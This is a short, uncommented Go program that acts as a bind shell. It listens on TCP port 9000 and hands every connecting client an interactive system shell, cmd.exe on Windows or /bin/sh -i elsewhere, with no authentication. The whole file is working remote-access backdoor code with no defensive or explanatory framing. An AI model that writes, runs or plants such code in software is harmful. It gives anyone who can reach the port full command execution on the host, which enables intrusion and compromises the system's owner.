package main

import (
	"fmt"
	"io"
	"log"
	"net"
	"os/exec"
	"runtime"
)

func handleConnection(conn net.Conn) {
	var cmd *exec.Cmd

	switch runtime.GOOS {
	case "windows":
		cmd = exec.Command("cmd.exe")
	default:
		cmd = exec.Command("/bin/sh", "-i")
	}

	rp, wp := net.Pipe()
	cmd.Stdin = conn
	cmd.Stdout = wp
	cmd.Stderr = wp

	go io.Copy(conn, rp)

	err := cmd.Run()

	if err != nil {
		log.Fatal("command could not run")
	}

	err = conn.Close()
	if err != nil {
		log.Fatal("could not close")
	}
}

func main() {
	listener, err := net.Listen("tcp", ":9000")

	if err != nil {
		log.Fatal("could not bind on port ")
	}

	for {
		conn, err := listener.Accept()
		fmt.Println("Connected one client")

		if err != nil {
			log.Fatal("Could not make connection")
		}

		handleConnection(conn)
	}
}
